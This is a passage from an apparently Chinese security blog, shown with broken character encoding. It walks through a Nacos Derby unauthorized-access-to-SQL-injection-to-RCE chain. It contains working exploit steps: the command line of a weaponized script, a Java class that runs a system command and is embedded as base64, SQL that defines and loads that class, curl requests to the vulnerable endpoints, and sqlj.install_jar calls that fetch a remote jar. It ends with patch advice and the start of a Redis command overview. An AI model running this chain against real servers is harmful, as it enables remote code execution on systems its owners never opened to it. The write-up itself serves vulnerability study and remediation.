src="https://img1.plumstar.cn/upload5image-20240911155753457.png"></p><p>å¼€å¯é‰´æƒé…ç½®åå³å¯åšåˆ°é™åˆ¶æœªæˆæƒè®¿é—®</p><p><img src="https://img1.plumstar.cn/upload5image-20240911160249166.png"></p><h1 id="Derbyæœªæˆæƒ-SQLæ³¨å…¥-RCE"><a href="#Derbyæœªæˆæƒ-SQLæ³¨å…¥-RCE" class="headerlink" title="Derbyæœªæˆæƒ-&gt;SQLæ³¨å…¥-&gt;RCE"></a>Derbyæœªæˆæƒ-&gt;SQLæ³¨å…¥-&gt;RCE</h1><h2 id="æ¼æ´æè¿°-1"><a href="#æ¼æ´æè¿°-1" class="headerlink" title="æ¼æ´æè¿°"></a><em>æ¼æ´æè¿°</em></h2><p>åœ¨ä¸Šæ–‡ä¸­æˆ‘ä»¬åˆ†æäº†ï¼ŒDerbyæœªæˆæƒSQLæ³¨å…¥åˆ©ç”¨çš„æ˜¯&#x2F;derbyè¿™ä¸ªè·¯ç”±ï¼Œä½†æ˜¯é™åˆ¶äº†è¯­å¥å¿…é¡»ä¸ºselectå¼€å¤´çš„å³æŸ¥è¯¢è¯­å¥ï¼Œè€Œä»…ä»…æ˜¯æŸ¥è¯¢è¯­å¥å°±æ— æ³•RCEã€‚æ‰€ä»¥DerbyRCEçš„è¿™ä¸ªæ¼æ´æ˜¯åˆ©ç”¨removalæ¥å£åœ¨å®Œæˆè¿™ä¸ªåˆ©ç”¨é“¾å®Œæˆderbyæ³¨å…¥çš„æ·±å…¥åˆ©ç”¨ï¼ˆæœ€å¼€å§‹å‡ºæ¥çš„æ‰“æ³•ç”¨åˆ°çš„æ˜¯â€CALL sqlj.install_jarâ€ç®€å•æ¥è¯´å°±æ˜¯å°†è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„jaråŒ…å¯¼å…¥æ•°æ®åº“ï¼Œå°±å¯ä»¥åŠ¨æ€è°ƒç”¨ç±»ä¸­çš„staticæ–¹æ³•ï¼‰ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“ç»„åˆæ‹³RCEï¼Œå¯ä»¥ç®—æ˜¯Nacosè¿œç¨‹ä»£ç æ‰§è¡Œ</p><p>è¿™ä¸ªæ¼æ´æ²¡ç»™ç¼–å·ï¼Œçœ‹äº†ä¸€ä¸‹é•¿äº­çš„é€šå‘Šæ˜¯7æœˆ19æ—¥çš„é€šå‘Šï¼ŒæŒºå“äººçš„ï¼ŒHWåˆšå‡†å¤‡å¼€å§‹å°±å‡ºæ¥äº†ï¼Œå½±å“ç‰ˆæœ¬Nacos &lt; 2.4.0</p><p><img src="https://img1.plumstar.cn/upload5image-20240911164529873.png"></p><p>æˆ‘è¿™é‡Œæ¼æ´ç¯å¢ƒå°±ç”¨äº†2.3.2ï¼Œåªè¦ä½äº2.4.0å°±å¯ä»¥äº†</p><h2 id="æ¼æ´æ£€æµ‹-1"><a href="#æ¼æ´æ£€æµ‹-1" class="headerlink" title="æ¼æ´æ£€æµ‹"></a><em>æ¼æ´æ£€æµ‹</em></h2><p>å…³äºæ¼æ´çš„æ‰‹åŠ¨æ£€æµ‹ï¼Œæˆ‘çœ‹æ‡‚äº†ï¼Œä½†æ˜¯æ„Ÿè§‰æ¯”è¾ƒå¤æ‚ï¼Œæ–¹æ³•æˆ‘å†™åœ¨è¿™é‡Œå¤§å®¶å¯ä»¥å»éªŒè¯ä¸€ä¸‹ï¼Œæˆ‘æ›´å€¾å‘äºç›´æ¥è„šæœ¬ä¸€æŠŠæ¢­ï¼Œè™½ç„¶åŸç‰ˆpocè¢«åˆ äº†ä½†æ˜¯è¿˜æ˜¯æµä¼ å‡ºæ¥äº†å¹¶ä¸”æ­¦å™¨åŒ–äº†ï¼Œå…³äºåŸç‰ˆpocçš„åˆ†æåç»­æˆ‘å¯èƒ½ä¼šå‡ºï¼Œæ—¶é—´æœªçŸ¥</p><p><a href="https://github.com/FFR66/Nacos_Rce">https://github.com/FFR66/Nacos_Rce</a></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean">### å¯åŠ¨serviceï¼Œä¹Ÿå°±æ˜¯æœåŠ¡ç«¯ï¼Œå¸¦ç€æˆ‘ä»¬è¦æ‰“çš„payload<br>python3 service.py<br>### å¯åŠ¨ä¸»ç¨‹åº<br>python3 Nacos_Rce.py -t vpsçš„ipåœ°å€ -p <span class="hljs-number">5000</span> -u http:<span class="hljs-comment">//xxx.xxx.xxx -c whoami</span><br>ä¾‹å¦‚æˆ‘è¿™é‡Œæ˜¯åœ¨æœ¬åœ°<br>python3 Nacos_Rce.py -t <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -p <span class="hljs-number">5000</span> -u http:<span class="hljs-comment">//192.168.50.1ï¼š8848 -c whoami</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240911231405911.png"></p><p>è¿™ç§æ€è·¯å°±æ˜¯æˆ‘ä»¬å†™åˆ°æœ¬åœ°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„vpsï¼Œç„¶åå»åŠ è½½ã€‚ä½†æ˜¯è¿™ç§æ–¹å¼ï¼Œå¿…é¡»åœ¨æœºå™¨å‡ºç½‘çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç›®æ ‡æœºå™¨ä¸å‡ºç½‘ï¼Œå°±æ­‡èœäº†</p><p><strong>è¿™é‡Œè¿˜æƒ³è¯´åœ¨ç½‘ä¸Šçœ‹åˆ°çš„å¦ä¸€ä½å¸ˆå‚…çš„æ€è·¯ï¼Œé€šè¿‡create type typeClass external çš„æ–¹å¼è‡ªå®šä¹‰æ•°æ®ç±»å‹æ¥æ˜ å°„javaç±»</strong></p><p>é¦–å…ˆéªŒè¯æœªæˆæƒå­˜åœ¨</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -XGET <span class="hljs-string">&quot;http://192.168.92.1:8848/nacos/v1/cs/ops/derby?sql=select<span class="hljs-variable">%20</span>*<span class="hljs-variable">%2</span>0from<span class="hljs-variable">%2</span>0users<span class="hljs-variable">%20</span>&quot;</span><br></code></pre></td></tr></table></figure><p>ç„¶ååˆ¶ä½œå‘½ä»¤æ‰§è¡Œç±»</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">â”Œâ”€â”€(rootã‰¿kali)-[/tmp]<br>â””â”€# vim MaliciousClass.java<br><br><span class="hljs-bullet">--</span><br><span class="hljs-bullet"></span>public class MaliciousClass &#123;<br><span class="hljs-code">    static &#123;</span><br><span class="hljs-code">        try &#123;</span><br><span class="hljs-code">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-code">        &#125; catch (Exception e) &#123;</span><br><span class="hljs-code">                //TODO:handle exception</span><br><span class="hljs-code">        &#125;</span><br><span class="hljs-code">    &#125;</span><br><span class="hljs-section">&#125;</span><br><span class="hljs-section">--</span><br><br>â”Œâ”€â”€(rootã‰¿kali)-[/tmp]<br>â””â”€# javac MaliciousClass.java <br><br>â”Œâ”€â”€(rootã‰¿kali)-[/tmp]<br>â””â”€# cat MaliciousClass.class | base64<br>yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENv<br>ZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3Vy<br>Y2VGaWxlAQATTWFsaWNpb3VzQ2xhc3MuamF2YQwACAAJBwAZDAAaABsBAARjYWxjDAAcAB0BABNq<br>YXZhL2xhbmcvRXhjZXB0aW9uAQAOTWFsaWNpb3VzQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAR<br>amF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAE<br>ZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAA<br>AgABAAgACQABAAoAAAAdAAEAAQAAAAUqtwABsQAAAAEACwAAAAYAAQAAAAEACAAMAAkAAQAKAAAA<br>RwACAAEAAAAOuAACEgO2AARXpwAES7EAAQAAAAkADAAFAAIACwAAABIABAAAAAQACQAHAAwABQAN<br>AAgADQAAAAcAAkwHAA4AAAEADwAAAAIAEA==<br></code></pre></td></tr></table></figure><p><strong>å¯¹åº”çš„sqlè¯­å¥ï¼Œè¿™äº›è¯­å¥å…¶å®ä¹Ÿå¥½ç†è§£ï¼Œä¸Šé¢æˆ‘ä»¬æ˜¯ä»vpså»åŠ è½½æˆ‘ä»¬çš„payloadï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬è‡ªå·±å»åœ¨ç›®æ ‡æœºå™¨é€šè¿‡create type typeClass external çš„æ–¹å¼è‡ªå®šä¹‰æ•°æ®ç±»å‹æ¥æ˜ å°„javaç±»ï¼Œè¾¾åˆ°æ¶æ„ç±»çš„æ•ˆæœå¹¶ä¸”æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">type</span> typeClass <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;java.lang.Class&#x27;</span> <span class="hljs-keyword">language</span> java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">type</span> typeClassLoader <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;java.lang.ClassLoader&#x27;</span> <span class="hljs-keyword">language</span> java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> base64Decode(className <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>)) <span class="hljs-keyword">RETURNS</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>) <span class="hljs-keyword">FOR</span> <span class="hljs-type">BIT</span> DATA <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;org.springframework.util.Base64Utils.decodeFromString&#x27;</span> <span class="hljs-keyword">language</span> java parameter style java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> getSystemClassLoader() <span class="hljs-keyword">returns</span> typeClassLoader <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;java.lang.ClassLoader.getSystemClassLoader&#x27;</span> <span class="hljs-keyword">language</span> java parameter style java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> defineClass(className <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>), bytes <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>) <span class="hljs-keyword">FOR</span> <span class="hljs-type">BIT</span> DATA, loader typeClassLoader) <span class="hljs-keyword">returns</span> typeClass <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)&#x27;</span> <span class="hljs-keyword">language</span> java parameter style java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test(v typeClass)<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> test <span class="hljs-keyword">values</span> (defineClass(<span class="hljs-string">&#x27;MaliciousClass&#x27;</span>, base64Decode(<span class="hljs-string">&#x27;yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3VyY2VGaWxlAQATTWFsaWNpb3VzQ2xhc3MuamF2YQwACAAJBwAZDAAaABsBAARjYWxjDAAcAB0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAOTWFsaWNpb3VzQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAgABAAgACQABAAoAAAAdAAEAAQAAAAUqtwABsQAAAAEACwAAAAYAAQAAAAEACAAMAAkAAQAKAAAARwACAAEAAAAOuAACEgO2AARXpwAES7EAAQAAAAkADAAFAAIACwAAABIABAAAAAQACQAHAAwABQANAAgADQAAAAcAAkwHAA4AAAEADwAAAAIAEA==&#x27;</span>), getSystemClassLoader()));<br></code></pre></td></tr></table></figure><p>æ”»å‡»ï¼šå»GETæˆ‘ä»¬å†™åˆ°ç›®æ ‡æœºå™¨çš„è¿™ä¸ªç±»ï¼Œè·å–åˆ°æˆ‘ä»¬æƒ³è¦çš„</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;file=@./payload.sql&quot;</span> <span class="hljs-string">&quot;http://192.168.111.130:8848/nacos/v1/cs/ops/data/removal&quot;</span><br></code></pre></td></tr></table></figure><p>ä¸å‡ºæ„å¤–çš„è¯å¤ç°ä¼šé‡åˆ°â€file xxx does not existâ€ï¼Œè¿™ä¸ªå®é™…ä¸Šæ˜¯æ­£å¸¸çš„ï¼Œå»ºè®®å†™ä¸ªè„šæœ¬æŒ‚ç€æ‰“ç„¶åçœ‹è¿æ°”ä»€ä¹ˆæ—¶å€™ç¢°æ’æˆåŠŸäº†</p><p>è¿™ä½å¸ˆå‚…æä¾›çš„æ€è·¯æˆ‘å¹¶æ²¡å»å¤ç°ï¼Œå¤§å®¶æ„Ÿå…´è¶£çš„å¯ä»¥è¯•ä¸€ä¸‹</p><h2 id="æ¼æ´åŸç†-2"><a href="#æ¼æ´åŸç†-2" class="headerlink" title="æ¼æ´åŸç†"></a><em>æ¼æ´åŸç†</em></h2><p>ä¸¤éƒ¨åˆ†ï¼Œæœªæˆæƒéƒ¨åˆ†çš„åˆ†æåœ¨ä¸Šæ–‡å·²ç»å†™å‡ºäº†ã€‚</p><p>derbyæ•°æ®åº“rceçš„åŸç†é‡ç‚¹å°±æ˜¯ç†è§£ä¸Šé¢å†™å‡ºçš„æ‰“æ³•ä¸­ç”¨åˆ°çš„å‡½æ•°ï¼Œç¬¬ä¸‰ç§åœ¨ä¸Šæ–‡ä¸­å·²ç»å†™äº†ï¼Œè¿™é‡Œç®€å•è¡¥å……ä¸‹ä¸€å’ŒäºŒ</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#æœ€å¼€å§‹å…¬å¼€pocä¸­çš„åˆ©ç”¨æ–¹å¼ï¼Œè¿™ä¸ªå‡½æ•°ç›´æ¥å¯¼å…¥åˆ¶å®šjaråŒ…ï¼Œå‰ææ˜¯æ•°æ®åº“æœåŠ¡å™¨å¿…é¡»èƒ½å¤Ÿè®¿é—®äº’è”ç½‘ï¼Œè¿™åœ¨ä¸å‡ºç½‘çš„ç›®æ ‡ä¸­ä¸é€‚ç”¨ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢å·¥å…·é‚£é‡Œ</span><br><span class="hljs-built_in">CALL</span> sqlj.install_jar(<span class="hljs-string">&#x27;http://example.com/malicious.jar&#x27;</span>, <span class="hljs-string">&#x27;APP.malicious_jar&#x27;</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-meta">#å…ˆé€šè¿‡æ•°æ®åº“çš„å†…ç½®å·¥å…·å°† JAR åŒ…å†™åˆ°æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿï¼Œç„¶åå†åŠ è½½å®ƒ</span><br><span class="hljs-built_in">CALL</span> SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE(<span class="hljs-string">&#x27;SELECT my_blob_column FROM my_table&#x27;</span>, <span class="hljs-string">&#x27;my_exported_file.jar&#x27;</span>, <span class="hljs-string">&#x27;&lt;delimiter&gt;&#x27;</span>)<br><span class="hljs-built_in">CALL</span> sqlj.install_jar(<span class="hljs-string">&#x27;file:///path/to/my_exported_file.jar&#x27;</span>, <span class="hljs-string">&#x27;APP.local_jar&#x27;</span>, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>å…³äºå…·ä½“çš„ä»£ç å±‚é¢ï¼Œè¿™é‡Œæˆ‘å°±ä¸å†™äº†ï¼Œå…¶å®ä»£ç è·Ÿè¿›å¯èƒ½ç¨å¾®éš¾æ‡‚ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªæ¡ä»¶ç«äº‰å¹¶ä¸”derbyæ•°æ®åº“æ˜¯æ”¯æŒè°ƒç”¨Javaçš„æ–¹æ³•ï¼Œç„¶ååˆç»“åˆæœªæˆæƒï¼Œå¯¼è‡´äº†è¿™ä¸ªRCEçš„äº§ç”Ÿ</p><p><a href="https://baijiahao.baidu.com/s?id=1804988231747535544&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1804988231747535544&amp;wfr=spider&amp;for=pc</a></p><h2 id="æ¼æ´ä¿®å¤-1"><a href="#æ¼æ´ä¿®å¤-1" class="headerlink" title="æ¼æ´ä¿®å¤"></a><em>æ¼æ´ä¿®å¤</em></h2><p>å®˜æ–¹å·²åœ¨2.4.0ç‰ˆæœ¬ä¸­å¼•å…¥äº†ä¸€ä¸ªæ–°çš„é€‰é¡¹ derbyOpsEnabledï¼Œå¹¶å°†å…¶é»˜è®¤è®¾ç½®ä¸ºå…³é—­ï¼Œä»¥é˜²æ­¢ç›¸å…³æ¥å£è¢«æ»¥ç”¨ã€‚å¯åœ¨Nacoså®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆæœ¬ä½¿ç”¨ã€‚</p><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p>å†æ¬¡ç‰¹åˆ«é¸£è°¢å„ä½å¸ˆå‚…</p><p><a href="https://xz.aliyun.com/t/13169?time__1311=GqmhLGOGkD/D78G7FmeYveAKg115bIeD">https://xz.aliyun.com/t/13169?time__1311=GqmhLGOGkD%2FD78G7FmeYveAKg115bIeD</a></p><p><a href="https://xz.aliyun.com/t/15151?time__1311=GqjxuQD=cDlx0nD2DUxYwrIDcmYwhjox">https://xz.aliyun.com/t/15151?time__1311=GqjxuQD%3DcDlx0nD2DUxYwrIDcmYwhjox</a></p><p><a href="https://gitcode.csdn.net/66ca0098aa1c2020b35986ec.html">https://gitcode.csdn.net/66ca0098aa1c2020b35986ec.html</a></p>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨é—®é¢˜æ•´ç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Nacos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redisç³»åˆ—å®‰å…¨é—®é¢˜æ•´ç†</title>
    <link href="/2025/09/04/redis%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <url>/2025/09/04/redis%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="redisç›¸å…³"><a href="#redisç›¸å…³" class="headerlink" title="redisç›¸å…³"></a>redisç›¸å…³</h1><p>redisæ˜¯ä¸€ä¸ªkey-valueå­˜å‚¨ç³»ç»Ÿã€‚å’ŒMemcachedç±»ä¼¼ï¼Œå®ƒæ”¯æŒå­˜å‚¨çš„valueç±»å‹ç›¸å¯¹æ›´å¤šï¼ŒåŒ…æ‹¬stringã€listã€setã€zsetå’Œhashã€‚è¿™äº›æ•°æ®ç±»å‹éƒ½æ”¯æŒpush&#x2F;popã€add&#x2F;removeåŠå–äº¤é›†å¹¶é›†å’Œå·®é›†åŠæ›´ä¸°å¯Œçš„æ“ä½œï¼Œè€Œä¸”è¿™äº›æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œredisæ”¯æŒå„ç§ä¸åŒæ–¹å¼çš„æ’åºã€‚ä¸memcachedä¸€æ ·ï¼Œä¸ºäº†è¯æ•ˆç‡ï¼Œæ•°æ®éƒ½æ˜¯ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚åŒºåˆ«çš„æ˜¯redisä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº†master-slave(ä¸»ä»)åŒæ­¥ã€‚</p><h2 id="rediså¸¸ç”¨å‘½ä»¤"><a href="#rediså¸¸ç”¨å‘½ä»¤" class="headerlink" title="rediså¸¸ç”¨å‘½ä»¤"></a>rediså¸¸ç”¨å‘½ä»¤</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> xz <span class="hljs-string">&quot;Hacker&quot;</span>                     # è®¾ç½®é”®xzçš„å€¼ä¸ºå­—ç¬¦ä¸²Hacker<br>      <span class="hljs-built_in">get</span> xz                              # è·å–é”®xzçš„å†…å®¹<br>      <span class="hljs-built_in">SET</span> score 857                       # è®¾ç½®é”®scoreçš„å€¼ä¸º857<br>      INCR score                          # ä½¿ç”¨INCRå‘½ä»¤å°†scoreçš„å€¼å¢åŠ 1<br>      <span class="hljs-built_in">GET</span> score                           # è·å–é”®scoreçš„å†…å®¹<br>      keys *                              # åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰çš„é”®<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> protected-mode <span class="hljs-literal">no</span>        # å…³é—­å®‰å…¨æ¨¡å¼<br>      <span class="hljs-built_in">get</span> anotherkey                      # è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„é”®çš„å€¼<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> dir /root/redis          # è®¾ç½®ä¿å­˜ç›®å½•<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> dbfilename redis.rdb     # è®¾ç½®ä¿å­˜æ–‡ä»¶å<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">get</span> dir                      # æŸ¥çœ‹ä¿å­˜ç›®å½•<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">get</span> dbfilename               # æŸ¥çœ‹ä¿å­˜æ–‡ä»¶å<br>      save                                # è¿›è¡Œä¸€æ¬¡å¤‡ä»½æ“ä½œ<br>      flushall                            # åˆ é™¤æ‰€æœ‰æ•°æ®<br>      del key                             # åˆ é™¤é”®ä¸ºkeyçš„æ•°æ®<br>      slaveof<span class="hljs-built_in"> ip port </span>                # è®¾ç½®ä¸»ä»å…³ç³»<br>      redis-cli -h<span class="hljs-built_in"> ip </span>-p 6379 -a passwd   # å¤–éƒ¨è¿æ¥<br></code></pre></td></tr></table></figure><h2 id="RedisåŸºæœ¬æ“ä½œ"><a href="#RedisåŸºæœ¬æ“ä½œ" class="headerlink" title="RedisåŸºæœ¬æ“ä½œ"></a>RedisåŸºæœ¬æ“ä½œ</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">1</span>.ä½¿ç”¨<span class="hljs-built_in">SET</span>å’Œ<span class="hljs-built_in">GET</span>å‘½ä»¤ï¼Œå¯ä»¥å®ŒæˆåŸºæœ¬çš„èµ‹å€¼å’Œå–å€¼æ“ä½œï¼›<br><span class="hljs-number">2</span>.Redisæ˜¯ä¸åŒºåˆ†å‘½ä»¤çš„å¤§å°å†™çš„ï¼Œ<span class="hljs-built_in">set</span>å’Œ<span class="hljs-built_in">SET</span>æ˜¯åŒä¸€ä¸ªæ„æ€ï¼›<br><span class="hljs-number">3</span>.ä½¿ç”¨<span class="hljs-built_in">keys</span> *å¯ä»¥åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰é”®ï¼›<br><span class="hljs-number">4</span>.å½“å°è¯•è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„é”®çš„å€¼æ—¶ï¼ŒRedisä¼šè¿”å›ç©ºï¼Œå³(<span class="hljs-literal">nil</span>)ï¼›<br><span class="hljs-number">5</span>.å¦‚æœé”®çš„å€¼ä¸­æœ‰ç©ºæ ¼ï¼Œéœ€è¦ä½¿ç”¨åŒå¼•å·æ‹¬èµ·æ¥ï¼Œå¦‚<span class="hljs-string">&quot;Hello World&quot;</span>ï¼›<br></code></pre></td></tr></table></figure><h2 id="ReRedisé…ç½®æ–‡ä»¶å‚æ•°"><a href="#ReRedisé…ç½®æ–‡ä»¶å‚æ•°" class="headerlink" title="ReRedisé…ç½®æ–‡ä»¶å‚æ•°"></a>ReRedisé…ç½®æ–‡ä»¶å‚æ•°</h2><p>portå‚æ•°</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">æ ¼å¼ä¸º<span class="hljs-keyword">port</span>åé¢æ¥ç«¯å£å·ï¼Œå¦‚<span class="hljs-keyword">port</span> 6379ï¼Œè¡¨ç¤ºRedisæœåŠ¡å™¨å°†åœ¨6379ç«¯å£ä¸Šè¿›è¡Œç›‘å¬æ¥ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ã€‚<br></code></pre></td></tr></table></figure><p>bindå‚æ•°</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">æ ¼å¼ä¸ºbindåé¢æ¥<span class="hljs-built_in">IP</span>åœ°å€ï¼Œå¯ä»¥åŒæ—¶ç»‘å®šåœ¨å¤šä¸ª<span class="hljs-built_in">IP</span>åœ°å€ä¸Šï¼Œ<span class="hljs-built_in">IP</span>åœ°å€ä¹‹é—´ç”¨ç©ºæ ¼åˆ†ç¦»ï¼Œå¦‚bind <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>ï¼Œè¡¨å…è®¸<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span>å’Œ<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>ä¸¤ä¸ª<span class="hljs-built_in">IP</span>è¿æ¥ã€‚å¦‚æœè®¾ç½®ä¸º<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>åˆ™è¡¨ç¤ºä»»æ„<span class="hljs-built_in">ip</span>éƒ½å¯è¿æ¥ï¼Œè¯´ç™½äº†å°±æ˜¯ç™½åå•ã€‚<br></code></pre></td></tr></table></figure><p>saveå‚æ•°</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fortran">æ ¼å¼ä¸º<span class="hljs-keyword">save</span> &lt;ç§’æ•°&gt; 